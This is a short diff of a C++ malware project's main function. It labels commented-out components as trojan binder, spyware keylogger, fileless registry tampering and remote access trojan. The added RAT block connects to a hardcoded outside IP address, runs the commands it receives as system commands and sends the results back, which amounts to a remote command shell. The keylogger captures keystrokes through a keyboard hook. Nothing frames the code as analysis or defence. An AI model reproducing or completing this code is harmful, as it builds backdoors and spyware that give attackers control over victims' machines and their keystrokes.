@@ -4,6 +4,7 @@
 #include <thread>
 
 int	main(int argc, char** argv) {
+	// Virus -> Trojan
 	/*EXEBinder exeBinder;
 	if(exeBinder.AmIBinded(argv[0])) {
 		exeBinder.Open(argv[0]);
@@ -20,6 +21,7 @@ int	main(int argc, char** argv) {
 
 
 
+	// Spyware
 	/*std::thread threadKeylogger([] {
 		std::function<void(PKBDLLHOOKSTRUCT)> klCallback = [] (PKBDLLHOOKSTRUCT key) {
 			std::cout << Keylogger::vkCodesAll[key->vkCode] << " ";
@@ -32,14 +34,23 @@ int	main(int argc, char** argv) {
 
 
 
-	/*BClient bClient(DefaultSocketConfigurations::TCP, 32406, "162.55.32.18");
-	bClient.Connect();
-	bClient.ReceiveData();
-	bClient.SendData("Salut");
-	bClient.Disconnect();*/
+	// RAT (Remote Access Trojan / rootkit)
+	/*std::thread threadRAT([] {
+		BClient bClient(DefaultSocketConfigurations::TCP, 32406, "162.55.32.18");
+		bClient.Connect();
+		bClient.ReceiveData();
+		bClient.SendData("None");
+
+		std::string command;
+		while(!(command = bClient.ReceiveData()).empty()) {
+			bClient.SendData(Miscellaneous::System(command));
+		}
+	});
+	threadRAT.detach();*/
 
 
 
+	// Fileless
 	/*Registry registry;
 	registry.DisableAll(true);*/
 
